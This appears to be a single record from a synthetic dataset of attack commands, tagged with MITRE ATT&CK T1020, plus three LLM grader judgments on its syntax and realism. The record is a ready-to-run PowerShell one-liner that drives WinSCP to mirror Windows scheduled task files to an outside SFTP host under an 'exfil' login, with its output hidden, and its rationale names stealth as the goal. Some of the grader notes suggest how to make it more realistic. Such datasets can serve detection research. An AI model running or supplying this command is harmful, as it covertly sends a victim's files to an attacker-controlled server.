command: $r="/tasks/"; & 'C:\Program Files (x86)\WinSCP\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil:S3cr3t!@198.51.100.80/ -hostkey="ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="' ("synchronize remote C:\Windows\Tasks `"$r`" -criteria=time -filemask=`"|*.tmp;|*.log`"") 'exit' | Out-Null 2>$null
explanation: Uses WinSCP's synchronize mode to automatically mirror scheduled task files to a remote SFTP location while excluding noisy extensions.
rationale_steps: Connect via SFTP with host key pinning in batch mode
Synchronize remote with timestamp comparison only
Suppress all output to remain stealthy

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced quotes and parentheses, correct use of the call operator, proper escaping for embedded quotes, valid WinSCP /command arguments, and correct output/error redirection.
llm_judgments.semantic_justification: Non-interactive WinSCP synchronize remote will mirror C:\Windows\Tasks to an SFTP path with exclusions, aligning with automated exfiltration, though using C:\Windows\Tasks (vs. System32\Tasks) and potential access limitations slightly reduce realism.

llm_judgments.syntactic_justification: The command has mostly valid PowerShell and WinSCP syntax, but the synchronize command is passed as a bare parenthesized expression rather than a quoted string argument to /command, which may cause parsing issues in WinSCP.com's command interpreter, and the piping of Out-Null with 2>$null is redundant but not fatal.
llm_judgments.semantic_justification: The command accurately implements T1020 by using WinSCP's synchronize remote mode to automatically mirror C:\Windows\Tasks (which contains scheduled task files) to an external SFTP server with credentials, host key pinning, time-based criteria, and exclusion of noisy .tmp and .log files, fully consistent with automated exfiltration of collected data.

llm_judgments.syntactic_justification: The command uses valid PowerShell syntax, including the call operator, correct variable interpolation with backtick-escaped quotes, and proper WinSCP command-line arguments.
llm_judgments.semantic_justification: The command effectively leverages WinSCP's 'synchronize' feature to automate the transfer of a specific directory (scheduled tasks) to a remote SFTP server, perfectly aligning with the Automated Exfiltration technique.
